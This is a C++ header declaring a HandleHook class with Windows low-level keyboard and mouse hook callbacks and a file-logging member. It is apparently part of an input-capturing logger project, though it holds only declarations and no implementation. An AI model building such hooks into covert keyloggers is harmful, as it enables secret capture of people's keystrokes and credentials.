#pragma once

#ifndef HANDLEHOOK_H_
# define HANDLEHOOK_H_

#include "HookerKey.hh"
#include "HookerMouse.hh"
#include "FileLog.h"
#include <sstream>

class HandleHook
{
public:
	HandleHook();
	~HandleHook();

	static LRESULT CALLBACK MyKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
	static LRESULT CALLBACK MyMouseProc(int nCode, WPARAM wParam, LPARAM lParam);

	//static void * launchHook(void *);

	bool initialize(double timeout);
	bool getMessage();
	bool transAndDispatch();
private:
	MSG msg;
	FileLog file;
	double _t;
};

#endif /* HANDLEHOOK_H_ */